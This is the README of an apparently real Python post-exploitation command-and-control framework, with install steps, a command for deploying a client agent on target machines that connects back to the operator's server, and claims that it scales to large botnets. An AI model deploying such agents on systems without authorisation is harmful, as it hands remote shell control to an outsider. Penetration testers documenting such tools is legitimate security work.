# PyC2C: Python Post-Exploitation Framework with C2C Architecture

PyC2C is a Python-based post-exploitation framework designed with a Command and Control (C2C) architecture. It enables remote execution of shell code on multiple clients, also known as bots, providing powerful capabilities for penetration testers and security professionals.

## Features

- **C2C Architecture**: Allows centralized control over multiple compromised hosts.
- **Remote Shell Execution**: Execute shell commands on remote client machines.
- **Flexible Payload Generation**: Generate custom payloads tailored to specific targets.
- **Cross-Platform Compatibility**: Compatible with various operating systems supporting Python.
- **Scalability**: Easily scale up to control large botnets efficiently.

## Installation

1. Clone the PyC2C repository:

    ```
    git clone https://github.com/nafdev01/post-exploitation.git
    ```

2. Navigate to the PyC2C directory:

    ```
    cd post-exploitation
    ```

3. Install dependencies:

    ```
    pip install -r requirements.txt
    ```

## Usage

1. Start the C2C server:

    ```
    python botServer.py
    ```

2. Configure the server settings, such as listening IP and port.

3. Deploy the client agent on target machines:

    ```
    python botClient.py --server <server_ip> --port <server_port>
    ```

4. Once the clients connect to the server, you can execute commands remotely.

## Example

1. Execute a shell command on selected connected client:

    ```bash
    whoami
    ```
2. Change the currently active bot client
    
    ```
    select_bot
    ```

## Disclaimer

This tool is intended for educational and penetration testing purposes only. Unauthorized use of this tool may violate local, state, or federal law.

## Contribution

Contributions are welcome! Feel free to submit issues, feature requests, or pull requests to improve PyC2C.
